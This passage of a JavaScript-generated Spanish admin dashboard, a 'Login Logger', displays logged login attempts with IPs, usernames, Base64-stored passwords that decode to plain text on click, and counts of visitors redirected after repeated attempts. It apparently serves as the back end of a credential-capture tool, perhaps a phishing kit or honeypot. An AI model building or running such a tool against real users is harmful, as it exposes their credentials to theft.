    @keyframes livePulse{0%{box-shadow:0 0 0 0 rgba(34,197,94,.45);}70%{box-shadow:0 0 0 6px rgba(34,197,94,0);}100%{box-shadow:0 0 0 0 rgba(34,197,94,0);}}
    .topbar-right{margin-left:auto;display:flex;align-items:center;gap:.45rem;}
    /* Refresh */
    .refresh-wrap{display:flex;align-items:center;gap:.3rem;font-size:.72rem;color:var(--clr-muted);}
    .refresh-wrap select{font-size:.72rem;padding:2px 6px;border:1px solid var(--clr-border);border-radius:6px;background:var(--clr-surface);color:var(--clr-text);cursor:pointer;}
    #refreshCountdown{font-weight:700;min-width:28px;text-align:right;}
    /* Page */
    .page-wrap{max-width:1600px;margin:0 auto;padding:calc(var(--topbar-h) + 1.5rem) 1.25rem 3rem;}
    /* Stat cards */
    .stat-card{background:var(--clr-surface);border:1px solid var(--clr-border);border-radius:var(--radius-card);padding:1.1rem 1.3rem;display:flex;align-items:center;gap:1rem;box-shadow:var(--shadow-card);transition:transform .15s,box-shadow .15s,border-color .15s;text-decoration:none;color:inherit;}
    .stat-card:hover{transform:translateY(-2px);box-shadow:0 6px 20px rgba(0,0,0,.1);color:inherit;}
    .stat-card.active-filter{border-color:var(--clr-accent);box-shadow:0 0 0 3px rgba(59,130,246,.18);}
    .stat-icon{width:46px;height:46px;border-radius:12px;display:grid;place-items:center;font-size:1.25rem;flex-shrink:0;}
    .stat-value{font-size:1.7rem;font-weight:700;line-height:1;letter-spacing:-.02em;}
    .stat-label{font-size:.68rem;color:var(--clr-muted);text-transform:uppercase;letter-spacing:.08em;margin-top:3px;}
    .stat-hint{font-size:.6rem;color:#a0aec0;margin-top:2px;}
    /* Filter card */
    .filter-card{background:var(--clr-surface);border:1px solid var(--clr-border);border-radius:var(--radius-card);padding:1.1rem 1.3rem;box-shadow:var(--shadow-card);}
    .filter-card .form-control,.filter-card .form-select{font-size:.82rem;border-color:var(--clr-border);background:#f8fafc;}
    .filter-card .form-control:focus,.filter-card .form-select:focus{background:#fff;border-color:var(--clr-accent);box-shadow:0 0 0 3px rgba(59,130,246,.14);}
    .filter-label{font-size:.7rem;font-weight:600;text-transform:uppercase;letter-spacing:.07em;color:var(--clr-muted);margin-bottom:.4rem;}
    /* Exclude pills */
    .exclude-pill{font-size:.72rem;padding:.25rem .65rem;border-radius:20px;border:1.5px solid var(--clr-border);background:var(--clr-surface);color:var(--clr-text);transition:all .15s;user-select:none;}
    .exclude-pill:hover{border-color:#94a3b8;background:#f1f5f9;}
    .exclude-pill.excluded{background:#fef2f2;border-color:#fca5a5;color:#ef4444;text-decoration:line-through;opacity:.75;}
    .exclude-pill.excluded:hover{opacity:1;}
    /* Table card */
    .table-card{background:var(--clr-surface);border:1px solid var(--clr-border);border-radius:var(--radius-card);overflow:hidden;box-shadow:var(--shadow-card);}
    .table-card-header{padding:.9rem 1.3rem;border-bottom:1px solid var(--clr-border);display:flex;align-items:center;gap:.75rem;flex-wrap:wrap;background:#fafbfc;}
    .table-card-title{font-weight:600;font-size:.9rem;color:var(--clr-text);display:flex;align-items:center;gap:.5rem;}
    .table{margin:0;font-size:.8rem;}
    .table thead th{background:#f1f5f9;border-bottom:2px solid #dde3ec!important;color:#475569;font-size:.68rem;text-transform:uppercase;letter-spacing:.08em;font-weight:700;white-space:nowrap;padding:.75rem 1rem;}
    .table tbody td{padding:.6rem 1rem;vertical-align:middle;border-color:#f1f5f9!important;}
    .table tbody tr:hover td{background:#f8fbff;}
    .row-login td{background:#fff5f5;}
    .row-denied td{background:#fff8f0;}
    .row-login:hover td{background:#ffe4e4!important;}
    .row-denied:hover td{background:#fdefd8!important;}
    /* Code pills */
    .ip-code{font-family:var(--font-mono);font-size:.78em;background:#eff6ff;color:#2563eb;padding:2px 7px;border-radius:6px;white-space:nowrap;}
    .ip-clickable{cursor:pointer;transition:background .15s;}
    .ip-clickable:hover{background:#dbeafe;}
    .pw-code{font-family:var(--font-mono);font-size:.78em;background:#fff1f2;color:#dc2626;padding:2px 7px;border-radius:6px;word-break:break-all;}
    .pw-toggle{cursor:pointer;transition:background .15s,color .15s;}
    .pw-toggle:hover{filter:brightness(.92);}
    .pw-toggle[data-state="plain"]{background:#fef9c3;color:#92400e;}
    /* Delete btn */
    .btn-del{opacity:.3;transition:opacity .15s;}
    tr:hover .btn-del{opacity:.75;}
    .btn-del:hover{opacity:1!important;}
    /* Strength */
    .pw-strength{height:4px;border-radius:2px;transition:width .3s,background .3s;}
    /* IP filter badge */
    .ip-filter-badge{display:inline-flex;align-items:center;gap:.35rem;background:#eff6ff;border:1px solid #bfdbfe;color:#2563eb;border-radius:20px;padding:.2rem .65rem;font-size:.72rem;font-family:var(--font-mono);}
    .ip-filter-badge .remove-ip{cursor:pointer;color:#93c5fd;}
    .ip-filter-badge .remove-ip:hover{color:#dc2626;}
    /* Modal tables */
    .modal-ip-table td,.modal-ip-table th{font-size:.8rem;padding:.45rem .7rem;vertical-align:middle;}
    .modal-ip-table thead th,.users-table thead th{background:#f8fafc;font-size:.68rem;text-transform:uppercase;letter-spacing:.06em;color:#64748b;font-weight:700;border-bottom:2px solid #e2e8f0!important;}
    .users-table td,.users-table th{font-size:.82rem;padding:.5rem .75rem;vertical-align:middle;}
    /* Pagination */
    .pagination .page-link{font-size:.78rem;padding:.3rem .65rem;color:var(--clr-accent);}
    .pagination .page-item.active .page-link{background:var(--clr-accent);border-color:var(--clr-accent);}
    .pagination .page-item.disabled .page-link{color:var(--clr-muted);}
    /* Toast */
    .toast-container{position:fixed;bottom:1.5rem;right:1.5rem;z-index:9999;}
    /* Empty */
    .empty-state{padding:4rem 2rem;text-align:center;color:var(--clr-muted);}
    .empty-state .bi{font-size:3rem;color:#cbd5e1;}
    /* Footer */
    .page-footer{text-align:center;color:var(--clr-muted);font-size:.72rem;padding-top:.75rem;}
    ::-webkit-scrollbar{width:5px;height:5px;}
    ::-webkit-scrollbar-track{background:transparent;}
    ::-webkit-scrollbar-thumb{background:#cbd5e1;border-radius:3px;}
  </style>
</head>
<body>

<!-- TOPBAR -->
<header class="topbar">
  <a href="/admin/logs" class="topbar-brand">
    <span class="logo"><i class="bi bi-shield-lock-fill"></i></span>
    <span class="d-none d-sm-inline">Login Logger</span>
    <span class="badge bg-primary bg-opacity-10 text-primary border border-primary border-opacity-25 rounded-pill px-2" style="font-size:.6rem;font-weight:600;">ADMIN</span>
  </a>
  <div class="live-indicator"><span class="live-dot"></span><span class="d-none d-md-inline">En vivo</span></div>

  <div class="topbar-right">
    <div class="refresh-wrap d-none d-md-flex">
      <i class="bi bi-arrow-clockwise"></i>
      <select id="refreshSelect" onchange="updateRefresh(this.value)">
        <option value="0">Manual</option>
        <option value="15">15s</option>
        <option value="30">30s</option>
        <option value="60">1min</option>
        <option value="120">2min</option>
        <option value="300">5min</option>
      </select>
      <span id="refreshCountdown"></span>
    </div>

    <span class="text-muted d-none d-xl-inline" style="font-size:.72rem;white-space:nowrap;">
      <i class="bi bi-clock me-1"></i>${new Date().toLocaleString("es-ES")}
    </span>

    <button class="btn btn-sm btn-outline-secondary" data-bs-toggle="modal" data-bs-target="#ipModal" title="Panel de IPs">
      <i class="bi bi-globe2"></i>
      <span class="badge bg-dark text-white ms-1">${totalUniqueIPs}</span>
    </button>

    <a href="/admin/logs/download" class="btn btn-sm btn-outline-primary" title="Descargar log">
      <i class="bi bi-download"></i><span class="d-none d-sm-inline ms-1">.log</span>
    </a>

    <button class="btn btn-sm btn-outline-warning" data-bs-toggle="modal" data-bs-target="#usersModal" title="Gestionar usuarios">
      <i class="bi bi-people-fill"></i><span class="d-none d-sm-inline ms-1">Usuarios</span>
    </button>

    <button onclick="doLogout()" class="btn btn-sm btn-outline-danger" title="Cerrar sesión">
      <i class="bi bi-box-arrow-right"></i><span class="d-none d-sm-inline ms-1">Salir</span>
    </button>
  </div>
</header>

<div class="page-wrap">

  <!-- ── Stat cards ────────────────────────────────────────────── -->
  <div class="row g-3 mb-4">
    <div class="col-6 col-md-4 col-xl">
      <a href="/admin/logs?type=login_all" class="stat-card ${type === "login_all" || type === "login_attempt" || type === "max_attempts_redirect" ? "active-filter" : ""}">
        <div class="stat-icon" style="background:#fff0f0;color:#e53e3e;"><i class="bi bi-key-fill"></i></div>
        <div>
          <div class="stat-value" style="color:#e53e3e;">${globalLoginCount}</div>
          <div class="stat-label">Intentos login</div>
          <div class="stat-hint">${globalLoginNormal} normales · <span style="color:#7e22ce;">${globalMaxAttempts} redirigidos</span></div>
        </div>
      </a>
    </div>
    <div class="col-6 col-md-4 col-xl">
      <a href="/admin/logs?type=max_attempts_redirect" class="stat-card ${type === "max_attempts_redirect" ? "active-filter" : ""}">
        <div class="stat-icon" style="background:#faf0ff;color:#7e22ce;"><i class="bi bi-arrow-right-circle-fill"></i></div>
        <div><div class="stat-value" style="color:#7e22ce;">${globalMaxAttempts}</div><div class="stat-label">Redirigidos</div><div class="stat-hint">Clic para filtrar</div></div>
      </a>
    </div>
    <div class="col-6 col-md-4 col-xl">
      <a href="/admin/logs" class="stat-card ${!type && !ipFilter && !filter ? "active-filter" : ""}">
        <div class="stat-icon" style="background:#eff6ff;color:#3b82f6;"><i class="bi bi-collection-fill"></i></div>
        <div><div class="stat-value" style="color:#3b82f6;">${totalGlobal}</div><div class="stat-label">Total registros</div><div class="stat-hint">Ver todos</div></div>
      </a>
    </div>
    <div class="col-6 col-md-4 col-xl">
      <a href="/admin/logs?type=admin_access_denied" class="stat-card ${type === "admin_access_denied" ? "active-filter" : ""}">
        <div class="stat-icon" style="background:#fff8f0;color:#dd6b20;"><i class="bi bi-shield-exclamation"></i></div>
        <div><div class="stat-value" style="color:#dd6b20;">${globalAdminDenied}</div><div class="stat-label">Admin denegados</div><div class="stat-hint">Clic para filtrar</div></div>
      </a>
    </div>
    <div class="col-6 col-md-4 col-xl">
      <a href="/admin/logs?type=rate_limit_exceeded" class="stat-card ${type === "rate_limit_exceeded" ? "active-filter" : ""}">
        <div class="stat-icon" style="background:#fefce8;color:#ca8a04;"><i class="bi bi-slash-circle-fill"></i></div>
        <div><div class="stat-value" style="color:#ca8a04;">${globalRateLimited}</div><div class="stat-label">Rate limits</div><div class="stat-hint">Clic para filtrar</div></div>
      </a>
    </div>
    <div class="col-6 col-md-4 col-xl">
      <div class="stat-card" style="cursor:pointer;" data-bs-toggle="modal" data-bs-target="#ipModal" title="Ver panel de IPs">
        <div class="stat-icon" style="background:#f0fdf4;color:#16a34a;"><i class="bi bi-globe2"></i></div>
        <div><div class="stat-value" style="color:#16a34a;">${totalUniqueIPs}</div><div class="stat-label">IPs únicas</div><div class="stat-hint">Clic para ver panel</div></div>
      </div>
    </div>
  </div>

  <!-- ── Filter bar ──────────────────────────────────────────── -->
  <div class="filter-card mb-4">
    <form method="GET" action="/admin/logs" id="filterForm" class="row g-3 align-items-end">
      <div class="col-12 col-sm-6 col-lg-3">
        <div class="filter-label"><i class="bi bi-search me-1"></i>Buscar</div>
        <div class="input-group">
          <span class="input-group-text bg-white border-end-0" style="border-color:#e2e8f0;"><i class="bi bi-search text-muted" style="font-size:.78rem;"></i></span>
          <input type="text" name="filter" class="form-control border-start-0" placeholder="IP, usuario, contraseña…" value="${esc(filter)}"/>
        </div>
      </div>
      <div class="col-12 col-sm-6 col-lg-2">
        <div class="filter-label"><i class="bi bi-geo-alt me-1"></i>Filtrar IP</div>
        <div class="input-group">
          <input type="text" name="ip" class="form-control ${ipFilter ? "border-primary" : ""}" placeholder="192.168.1.1" value="${esc(ipFilter)}" style="font-family:var(--font-mono);font-size:.78rem;"/>
          ${ipFilter ? `<button type="button" class="btn btn-outline-secondary" onclick="clearIpFilter()"><i class="bi bi-x"></i></button>` : ""}
        </div>
      </div>
      <div class="col-6 col-sm-3 col-lg-2">
        <div class="filter-label"><i class="bi bi-tag me-1"></i>Evento</div>
        <select name="type" class="form-select">${typeOpts}</select>
      </div>
      <div class="col-6 col-sm-3 col-lg-2">
        <div class="filter-label"><i class="bi bi-list-ol me-1"></i>Por página</div>
        <select name="limit" class="form-select">${limitOpts}</select>
      </div>
      <div class="col-12 col-sm-6 col-lg-3 d-flex gap-2">
        <button type="submit" class="btn btn-primary flex-grow-1"><i class="bi bi-funnel-fill me-1"></i>Filtrar</button>
        <a href="/admin/logs" class="btn btn-outline-secondary px-3" title="Limpiar filtros"><i class="bi bi-x-lg"></i></a>
      </div>
      <div id="excludeInputs"></div>
      <div class="col-12">
        <div class="filter-label mb-2"><i class="bi bi-eye-slash me-1"></i>Excluir eventos <span class="text-muted" style="font-weight:400;text-transform:none;letter-spacing:0;">(clic para ocultar/mostrar)</span></div>
        <div class="d-flex gap-2 flex-wrap" id="excludeToggles">${excludePills}</div>
      </div>
      ${ipFilter ? `<div class="col-12 d-flex align-items-center gap-2 flex-wrap">
        <span class="filter-label mb-0">Mostrando sólo IP:</span>
        <span class="ip-filter-badge"><i class="bi bi-geo-alt-fill"></i>${esc(ipFilter)}<span class="remove-ip" onclick="clearIpFilter()">✕</span></span>
      </div>` : ""}
    </form>
  </div>

  <!-- ── Table ──────────────────────────────────────────────── -->
  <div class="table-card">
    <div class="table-card-header">
      <span class="table-card-title"><i class="bi bi-table text-primary"></i> Registros</span>
      <span class="badge bg-primary bg-opacity-10 text-primary border border-primary border-opacity-25">${totalFiltered} coincidencias</span>
      <span class="badge bg-secondary bg-opacity-10 text-secondary">Pág. ${page}/${totalPages}</span>
      ${filter ? `<span class="badge bg-warning bg-opacity-15 text-warning-emphasis border border-warning border-opacity-25"><i class="bi bi-funnel-fill me-1"></i>"${esc(filter)}"</span>` : ""}
      ${ipFilter ? `<span class="badge bg-info bg-opacity-15 text-info-emphasis border border-info border-opacity-25"><i class="bi bi-geo-alt me-1"></i>${esc(ipFilter)}</span>` : ""}
      ${excludeList.length ? `<span class="badge bg-danger bg-opacity-10 text-danger border border-danger border-opacity-25"><i class="bi bi-eye-slash me-1"></i>${excludeList.length} oculto${excludeList.length > 1 ? "s" : ""}</span>` : ""}
    </div>

    ${lines.length === 0 ? `
    <div class="empty-state">
      <i class="bi bi-inbox d-block mb-3"></i>
      <p class="fw-semibold text-secondary">No hay registros que mostrar</p>
      <p class="small">Ajusta los filtros o espera a que lleguen nuevos eventos.</p>
    </div>` : `
    <div class="table-responsive">
      <table class="table table-hover mb-0">
        <thead><tr>
          <th><i class="bi bi-clock me-1"></i>Timestamp</th>
          <th><i class="bi bi-geo-alt me-1"></i>IP</th>
          <th>Evento</th>
          <th>Método / Ruta</th>
          <th><i class="bi bi-person me-1"></i>Usuario</th>
          <th><i class="bi bi-key me-1"></i>Contraseña <small class="text-muted fw-normal">(clic=b64↔texto)</small></th>
          <th>User-Agent</th>
          <th style="width:36px;"></th>
        </tr></thead>
        <tbody>${rows}</tbody>
      </table>
    </div>`}
  </div>

  ${buildPagination()}

  <div class="page-footer mt-3">
    ${totalFiltered} resultados · <strong>${totalGlobal}</strong> registros totales · Página <strong>${page}</strong> de <strong>${totalPages}</strong>
  </div>

</div><!-- /page-wrap -->

<!-- MODAL: IPs -->
<div class="modal fade" id="ipModal" tabindex="-1" aria-hidden="true">
  <div class="modal-dialog modal-xl modal-dialog-scrollable">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title d-flex align-items-center gap-2">
          <i class="bi bi-globe2 text-primary"></i>Panel de IPs
          <span class="badge bg-primary bg-opacity-10 text-primary">${totalUniqueIPs} únicas</span>
        </h5>
        <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
      </div>
      <div class="modal-body p-0">
        <div class="p-3 border-bottom bg-light">
          <div class="input-group input-group-sm" style="max-width:320px;">
            <span class="input-group-text"><i class="bi bi-search"></i></span>
            <input type="text" id="ipModalSearch" class="form-control" placeholder="Buscar IP…" oninput="filterIpTable(this.value)"/>
          </div>
        </div>
        <div class="table-responsive">
          <table class="table table-hover mb-0 modal-ip-table">
            <thead><tr>
              <th>IP</th>
              <th class="text-center" style="cursor:pointer;" onclick="sortIpTable('total')">Total <i class="bi bi-arrow-down-up"></i></th>
              <th class="text-center" style="cursor:pointer;" onclick="sortIpTable('logins')">Logins <i class="bi bi-arrow-down-up"></i></th>
              <th class="text-center">Riesgo</th>
              <th>Último evento</th>
              <th></th>
            </tr></thead>
            <tbody id="ipTableBody">${ipRows}</tbody>
          </table>
        </div>
        ${totalUniqueIPs === 0 ? `<div class="text-center text-muted p-4"><i class="bi bi-inbox"></i> Sin datos de IPs</div>` : ""}
      </div>
      <div class="modal-footer">
        <small class="text-muted me-auto"><i class="bi bi-info-circle me-1"></i>Clic en una IP para filtrar. Datos de todos los logs.</small>
        <button type="button" class="btn btn-secondary btn-sm" data-bs-dismiss="modal">Cerrar</button>
      </div>
    </div>
  </div>
</div>

<!-- MODAL: GESTIÓN DE USUARIOS -->
<div class="modal fade" id="usersModal" tabindex="-1" aria-hidden="true">
  <div class="modal-dialog modal-lg modal-dialog-scrollable modal-dialog-centered">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title d-flex align-items-center gap-2">
          <i class="bi bi-people-fill text-warning"></i>Gestión de usuarios admin
        </h5>
        <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
      </div>
      <div class="modal-body">
        <div class="alert alert-info d-flex gap-2 align-items-start py-2 mb-4" style="font-size:.8rem;">
          <i class="bi bi-info-circle-fill flex-shrink-0 mt-1"></i>
          <span>Cambios inmediatos, persistidos en <code>logs/admin-users.json</code>.
          Puedes añadir múltiples admins o cambiar la contraseña de cualquiera.</span>
        </div>
        <h6 class="fw-semibold mb-2"><i class="bi bi-list-ul me-1 text-muted"></i>Usuarios existentes</h6>
        <div class="table-responsive mb-4">
          <table class="table table-hover users-table mb-0">
            <thead><tr><th>Usuario</th><th class="text-end">Acciones</th></tr></thead>
            <tbody id="usersTableBody">
              <tr><td colspan="2" class="text-center text-muted py-3"><span class="spinner-border spinner-border-sm me-2"></span>Cargando…</td></tr>
            </tbody>
          </table>
        </div>
        <hr class="my-3"/>
        <h6 class="fw-semibold mb-3"><i class="bi bi-person-plus me-1 text-muted"></i>Añadir nuevo usuario</h6>
        <div id="addUserAlert" class="d-none mb-3"></div>
        <div class="row g-3">
          <div class="col-md-4">
            <label class="form-label fw-semibold" style="font-size:.82rem;">Usuario</label>
            <input type="text" id="addUsername" class="form-control form-control-sm" placeholder="nuevo_admin" autocomplete="off"/>
          </div>
          <div class="col-md-4">
            <label class="form-label fw-semibold" style="font-size:.82rem;">Contraseña</label>
            <div class="input-group input-group-sm">
              <input type="password" id="addPassword" class="form-control" placeholder="Mín. 8 caracteres" oninput="checkPwStrength('addPwBar','addPwLabel',this.value)"/>
              <button class="btn btn-outline-secondary" type="button" onclick="togglePw('addPassword')"><i class="bi bi-eye"></i></button>
            </div>
            <div class="mt-1 d-flex gap-2 align-items-center">
              <div class="flex-grow-1 bg-light rounded" style="height:4px;overflow:hidden;"><div id="addPwBar" class="pw-strength" style="width:0%;background:#ef4444;"></div></div>
              <small id="addPwLabel" class="text-muted" style="font-size:.65rem;white-space:nowrap;"></small>
            </div>
          </div>
          <div class="col-md-4 d-flex align-items-end">
            <button class="btn btn-success btn-sm w-100" onclick="addUser()"><i class="bi bi-person-plus me-1"></i>Crear usuario</button>
          </div>
        </div>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary btn-sm" data-bs-dismiss="modal">Cerrar</button>
      </div>
    </div>
  </div>
</div>

<!-- MODAL: CAMBIAR CONTRASEÑA -->
<div class="modal fade" id="changePassModal" tabindex="-1" aria-hidden="true" data-bs-backdrop="static">
  <div class="modal-dialog modal-dialog-centered">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title d-flex align-items-center gap-2">
          <i class="bi bi-key-fill text-warning"></i>
          Cambiar contraseña: <strong id="cpModalUser" class="text-primary ms-1"></strong>
        </h5>
        <button type="button" class="btn-close" onclick="backToUsers()"></button>
      </div>
      <div class="modal-body">
        <div id="cpAlert" class="d-none mb-3"></div>
        <div class="mb-3">
          <label class="form-label fw-semibold" style="font-size:.82rem;">Nueva contraseña</label>
          <div class="input-group">
            <input type="password" id="cpNewPass" class="form-control" placeholder="Mínimo 8 caracteres" oninput="checkPwStrength('cpPwBar','cpPwLabel',this.value)"/>
            <button class="btn btn-outline-secondary" type="button" onclick="togglePw('cpNewPass')"><i class="bi bi-eye"></i></button>
          </div>
          <div class="mt-1 d-flex gap-2 align-items-center">
            <div class="flex-grow-1 bg-light rounded" style="height:4px;overflow:hidden;"><div id="cpPwBar" class="pw-strength" style="width:0%;background:#ef4444;"></div></div>
            <small id="cpPwLabel" class="text-muted" style="font-size:.65rem;white-space:nowrap;"></small>
          </div>
        </div>
        <div class="mb-3">
          <label class="form-label fw-semibold" style="font-size:.82rem;">Confirmar contraseña</label>
          <div class="input-group">
            <input type="password" id="cpConfirm" class="form-control" placeholder="Repite la contraseña"/>
            <button class="btn btn-outline-secondary" type="button" onclick="togglePw('cpConfirm')"><i class="bi bi-eye"></i></button>
          </div>
        </div>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-outline-secondary btn-sm" onclick="backToUsers()">← Volver</button>
        <button type="button" class="btn btn-warning btn-sm" id="cpSaveBtn" onclick="saveNewPassword()">
          <i class="bi bi-key-fill me-1"></i>Guardar contraseña
        </button>
      </div>
    </div>
  </div>
</div>

<!-- TOAST -->
<div class="toast-container">
  <div id="appToast" class="toast align-items-center border-0 text-white" role="alert">
    <div class="d-flex">
      <div id="appToastBody" class="toast-body fw-semibold"></div>
      <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast"></button>
    </div>
  </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
<script>
// ══ AUTO-REFRESH ════════════════════════════════════════
const refreshSelect    = document.getElementById("refreshSelect");
const refreshCountdown = document.getElementById("refreshCountdown");
let refreshInterval    = parseInt(localStorage.getItem("ll_refresh") || "30");
let refreshTimer       = null;
let refreshRemaining   = 0;

function updateRefresh(val) {
  refreshInterval = parseInt(val);
  localStorage.setItem("ll_refresh", refreshInterval);
  clearRefreshTimer();
  refreshCountdown.textContent = "";
  if (refreshInterval > 0) startRefreshTimer();
}
function startRefreshTimer() {
  refreshRemaining = refreshInterval;
  refreshCountdown.textContent = refreshRemaining + "s";
  refreshTimer = setInterval(() => {
    refreshRemaining--;
    refreshCountdown.textContent = refreshRemaining + "s";
    if (refreshRemaining <= 0) { clearRefreshTimer(); location.reload(); }
  }, 1000);
}
function clearRefreshTimer() {
  if (refreshTimer) { clearInterval(refreshTimer); refreshTimer = null; }
}
refreshSelect.value = String(refreshInterval);
if (refreshInterval > 0) startRefreshTimer();

document.querySelectorAll(".modal").forEach(m => {
  m.addEventListener("show.bs.modal",   clearRefreshTimer);
  m.addEventListener("hidden.bs.modal", () => { if (refreshInterval > 0) startRefreshTimer(); });
});

// ══ PAGINACIÓN ══════════════════════════════════════════
function goToPage() {
  const p = parseInt(document.getElementById("gotoPage")?.value);
  if (!p || p < 1) return;
  const url = new URL(location.href);
  url.searchParams.set("page", p);
  location.href = url.toString();
}
document.getElementById("gotoPage")?.addEventListener("keydown", e => { if (e.key === "Enter") { e.preventDefault(); goToPage(); } });

// ══ IP HELPERS ══════════════════════════════════════════
function clearIpFilter() {
  const url = new URL(location.href);
  url.searchParams.delete("ip");
  url.searchParams.set("page", "1");
  location.href = url.toString();
}
document.querySelectorAll("code.ip-clickable").forEach(el => {
  el.addEventListener("click", e => {
    e.stopPropagation();
    const url = new URL(location.href);
    url.searchParams.set("ip", el.dataset.ip);
    url.searchParams.set("page", "1");
    location.href = url.toString();
  });
});
document.querySelectorAll(".ip-modal-filter").forEach(el => {
  el.addEventListener("click", () => {
    bootstrap.Modal.getInstance(document.getElementById("ipModal"))?.hide();
    const url = new URL(location.href);
    url.searchParams.set("ip", el.dataset.ip);
    url.searchParams.set("page", "1");
    location.href = url.toString();
  });
});

// ══ EXCLUSIÓN DE EVENTOS ════════════════════════════════
const excludedSet = new Set(${JSON.stringify(excludeList)});
function updateExcludeInputs() {
  const c = document.getElementById("excludeInputs");
  c.innerHTML = "";
  excludedSet.forEach(ev => {
    const inp = document.createElement("input");
    inp.type = "hidden"; inp.name = "exclude"; inp.value = ev;
    c.appendChild(inp);
  });
}
document.querySelectorAll(".exclude-pill").forEach(btn => {
  btn.addEventListener("click", () => {
    const ev = btn.dataset.event;
    // Pill virtual: actúa sobre login_attempt + max_attempts_redirect a la vez
    if (ev === "login_all") {
      const bothOn = excludedSet.has("login_attempt") && excludedSet.has("max_attempts_redirect");
      if (bothOn) {
        excludedSet.delete("login_attempt");
        excludedSet.delete("max_attempts_redirect");
      } else {
        excludedSet.add("login_attempt");
        excludedSet.add("max_attempts_redirect");
      }
      // Sincronizar estado visual de las pills individuales
      document.querySelectorAll(".exclude-pill[data-event='login_attempt'], .exclude-pill[data-event='max_attempts_redirect']").forEach(p => {
        p.classList.toggle("excluded", excludedSet.has(p.dataset.event));
      });
      btn.classList.toggle("excluded", excludedSet.has("login_attempt") && excludedSet.has("max_attempts_redirect"));
    } else {
      excludedSet.has(ev) ? excludedSet.delete(ev) : excludedSet.add(ev);
      btn.classList.toggle("excluded", excludedSet.has(ev));
      // Actualizar estado del pill "todos los logins"
      const allLoginPill = document.querySelector(".exclude-pill[data-event='login_all']");
      if (allLoginPill) {
        allLoginPill.classList.toggle("excluded",
          excludedSet.has("login_attempt") && excludedSet.has("max_attempts_redirect"));
      }
    }
    updateExcludeInputs();
    clearTimeout(btn._t);
    btn._t = setTimeout(() => {
      const form = document.getElementById("filterForm");
      form.querySelector("input[name=page]")?.remove();
      form.submit();
    }, 350);
  });
});
updateExcludeInputs();

// ══ BASE64 TOGGLE ════════════════════════════════════════
document.querySelectorAll(".pw-toggle").forEach(el => {
  el.addEventListener("click", e => {
    e.stopPropagation();
    const state = el.dataset.state;
    const b64   = el.dataset.b64;
    if (state === "b64") {
      try {
        const plain = atob(b64);
        el.textContent = plain;
        el.dataset.state = "plain";
        el.title = "Clic para volver a codificar en Base64";
        el.style.background = "#fef9c3";
        el.style.color = "#92400e";
      } catch { el.textContent = "[error al decodificar]"; }
    } else {
      el.textContent = b64;
      el.dataset.state = "b64";
      el.title = "Clic para decodificar";
      el.style.background = "";
      el.style.color = "";
    }
  });
});

// ══ ELIMINAR LOG ════════════════════════════════════════
document.querySelectorAll(".btn-del").forEach(btn => {
  btn.addEventListener("click", async e => {
    e.stopPropagation();
    const lineIndex = btn.dataset.line;
    if (!confirm("¿Eliminar este registro de log? Esta acción no se puede deshacer.")) return;
    try {
      const res  = await fetch("/admin/logs/line/" + lineIndex, { method: "DELETE" });
      const data = await res.json();
      if (res.ok && data.success) {
        const row = btn.closest("tr");
        row.style.transition = "opacity .3s, transform .3s";
        row.style.opacity    = "0";
        row.style.transform  = "translateX(20px)";
        setTimeout(() => row.remove(), 320);
        showToast("🗑 Registro eliminado", "success");
      } else { showToast(data.error || "Error al eliminar", "danger"); }
    } catch { showToast("Error de red", "danger"); }
  });
});

// ══ MODAL IPs ════════════════════════════════════════════
function filterIpTable(q) {
  q = q.toLowerCase();
  document.querySelectorAll("#ipTableBody tr").forEach(r => {
    r.style.display = r.textContent.toLowerCase().includes(q) ? "" : "none";
  });
}
let ipSortDir = { total: -1, logins: -1 };
function sortIpTable(col) {
  ipSortDir[col] *= -1;
  const tbody = document.getElementById("ipTableBody");
  const rows  = Array.from(tbody.querySelectorAll("tr"));
  const idx   = col === "total" ? 1 : 2;
  rows.sort((a, b) => ((parseInt(b.cells[idx]?.textContent) || 0) - (parseInt(a.cells[idx]?.textContent) || 0)) * ipSortDir[col]);
  rows.forEach(r => tbody.appendChild(r));
}

// ══ GESTIÓN DE USUARIOS ══════════════════════════════════
let currentEditUser = null;

async function loadUsers() {
  const tbody = document.getElementById("usersTableBody");
  try {
    const res  = await fetch("/admin/users");
    const data = await res.json();
    if (!data.users?.length) {
      tbody.innerHTML = \`<tr><td colspan="2" class="text-center text-muted">Sin usuarios</td></tr>\`;
      return;
    }
    tbody.innerHTML = data.users.map(u => \`
      <tr>
        <td><i class="bi bi-person-circle me-2 text-muted"></i><strong>\${escHtml(u)}</strong></td>
        <td class="text-end">
          <button class="btn btn-sm btn-outline-warning py-0 px-2 me-1" style="font-size:.75rem;" onclick="openChangePass('\${escHtml(u)}')">
            <i class="bi bi-key me-1"></i>Cambiar contraseña
          </button>
          <button class="btn btn-sm btn-outline-danger py-0 px-2" style="font-size:.75rem;" onclick="deleteUser('\${escHtml(u)}')">
            <i class="bi bi-trash3"></i>
          </button>
        </td>
      </tr>\`).join("");
  } catch {
    tbody.innerHTML = \`<tr><td colspan="2" class="text-danger small">Error al cargar usuarios</td></tr>\`;
  }
}

function escHtml(s) {
  return String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
}

document.getElementById("usersModal").addEventListener("show.bs.modal", loadUsers);

async function deleteUser(username) {
  if (!confirm('¿Eliminar al usuario "' + username + '"?')) return;
  const res  = await fetch("/admin/users/" + encodeURIComponent(username), { method: "DELETE" });
  const data = await res.json();
  if (res.ok) { showToast("🗑 Usuario eliminado", "success"); await loadUsers(); }
  else showToast(data.error || "Error", "danger");
}

function openChangePass(username) {
  currentEditUser = username;
  document.getElementById("cpModalUser").textContent = username;
  document.getElementById("cpNewPass").value  = "";
  document.getElementById("cpConfirm").value  = "";
  document.getElementById("cpAlert").className = "d-none mb-3";
  document.getElementById("cpPwBar").style.width = "0%";
  document.getElementById("cpPwLabel").textContent = "";
  bootstrap.Modal.getInstance(document.getElementById("usersModal"))?.hide();
  setTimeout(() => new bootstrap.Modal(document.getElementById("changePassModal")).show(), 200);
